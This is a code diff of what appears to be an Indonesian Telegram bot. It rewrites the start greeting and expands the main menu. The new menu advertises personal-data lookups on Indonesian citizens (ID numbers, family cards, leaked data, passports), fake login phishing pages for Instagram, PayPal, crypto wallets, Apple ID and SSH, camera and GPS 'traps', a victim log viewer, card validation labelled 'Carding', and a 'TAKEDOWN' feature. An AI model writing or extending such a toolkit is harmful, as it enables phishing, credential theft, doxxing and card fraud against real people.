@@ -1591,15 +1591,53 @@ There are no background services or permissions associated.
     });
 
     const getStartMsg = (name: string) => {
-        return `HALO PRIA-PRIA YANG TERSAKITI SELAMAT DATANG DI TERMINAL 🐉 TRIHEXA 🐉\n\nBOT INI MENYEDIAKAN BANYAK FITUR FITUR ADVANCE SECARA GRATIS, SELAMA MASIH ADA OTAK DAN LOGIKA DIBALIKNYA MOHON GUNAKAN DENGAN BIJAK.\n\n"KAMI, TRIHEXA, BUKAN KAPITALIS. KARENA INI GRATIS MOHON GUNAKAN DENGAN OTAK YANG BENAR"\n\nSALAM HORMAT PEMBUAT SAYA\n- JEEMIKKO\n\n<i>Silakan pilih menu di bawah ini:</i>\n<i>Session Active for: ${name}</i>`;
+        const hour = new Date().getHours();
+        let greeting = 'malam';
+        if (hour >= 4 && hour < 11) greeting = 'pagi';
+        else if (hour >= 11 && hour < 15) greeting = 'siang';
+        else if (hour >= 15 && hour < 18) greeting = 'sore';
+
+        return `👋 Selamat ${greeting}, <b>${name}</b>! 🚀\n\n` +
+               `⚠️ <b>P E N G G U N A A N  B O T</b> ⚠️\n` +
+               `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+               `<blockquote>` +
+               `🔒 Larangan keras penyalahgunaan sistem\n` +
+               `⚖️ Admin tidak bertanggung jawab atas kerugian\n` +
+               `📜 Wajib mematuhi peraturan perundang-undangan` +
+               `</blockquote>\n\n` +
+               `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+               `© JeeMikko - Hak Cipta Dilindungi`;
     };
     
     const mainReplyKeyboard = Markup.keyboard([
-      ['🕵️ OSINT & Tracker', '🗣️ Advanced Stealth Log'],
-      ['🛠️ Adv Tools', '🎮 Mini Games'],
-      ['🎵 Media Downloader', '⏰ Alarm System'],
-      ['📲 WhatsApp Bot', '📱 QR Generator'],
-      ['ℹ️ Bot Info', '🛒 Buy Bot']
+      ['🔒 AKSES STANDAR 🔒'],
+      ['── 🔍 LAYANAN PENCARIAN DATA ──'],
+      ['🖨️ Cek Kartu Keluarga [TRIAL]', '🆔 Cek NIK [TRIAL]', '🔍 Cek Data Bocor'],
+      ['🚗 Cek Plat Nopol', '👨‍💼 Cek NIP/ASN', '🏢 Cek NIB Bisnis'],
+      ['🎓 Cek SIVIL Ijazah', '⚖️ Putusan Mahkamah', '🏛️ Cek Pajak PBB'],
+      ['🚔 Cek DPO Polri', '🛂 Cek Paspor', '🛑 Cekal Imigrasi'],
+      ['🗳️ Cek DPT KPU', '📜 Cek Sertipikat BPN', '📦 Cek Bea Cukai'],
+      ['🏦 Cek OJK Hukum', '💼 Cek Perusahaan AHU', '💍 Cek Buku Nikah'],
+      ['── 🕵️ GLOBAL OSINT ──'],
+      ['🧠 Intelligence Correlator', '🌐 IP Geolocation Tracker', '📡 Reverse IP Lookup'],
+      ['🔎 WHOIS Domain', '🌍 DNS Records Lookup', '🕸️ Subdomain Scanner', '🕷️ Shodan Dorking'],
+      ['📧 Email Validator & Leak', '👤 Sosmed & Username Tracker', '📞 Phone Tracker (HLR)'],
+      ['💻 MAC Address OSINT', '🚀 Port Scanner', '🚨 CVE Exploit Lookup'],
+      ['── 🛑 TRAP & LOGGER ──'],
+      ['📸 Request Camera Trap', '📍 Request GPS Trap'],
+      ['🎣 Fake Login IG/Meta', '💬 Fake Login FB/Messenger', '💼 Fake Login LinkedIn'],
+      ['💰 Fake Login Crypto/Wallet', '💳 Fake Login PayPal', '🛒 Fake Login Amazon/Toko'],
+      ['🎮 Fake Login Steam', '🍎 Fake Login AppleID', '🐧 Fake Login Linux/SSH'],
+      ['🎵 Fake Login Spotify/Netflix', '📁 Fake Login GDrive/Dropbox', '🛡️ Trap Bypass Cloudflare'],
+      ['📊 Lihat Log Korban (Logger)', '⚙️ Set Custom Domain Tracker'],
+      ['── 🛠️ ADVANCED CYBER TOOLS ──'],
+      ['🔐 Hash Generator (MD5/SHA)', '🔓 Base64 Encode/Decode', '💳 Cek Info BIN Card'],
+      ['💳 Validasi CC (Carding)', '🧪 XSS Scanner', '🦠 VirusTotal Web/File Scan'],
+      ['── 🧩 UTILITAS & MEDIA ──'],
+      ['🎵 Download Lagu/Audio', '🎥 Download Video (IG/TikTok)', '🌤️ Info Cuaca Area'],
+      ['⏰ Sistem Alarm Pengingat', '📈 Info Harga Crypto (Live)', '📲 Koneksi Bot WhatsApp'],
+      ['── 💀 PRO FITUR ──'],
+      ['💀 SANTO PETRUS (TAKEDOWN)', 'ℹ️ Informasi Bot & Bantuan']
     ]).resize();
 
     // Global Error Handler for "Anti Bug"
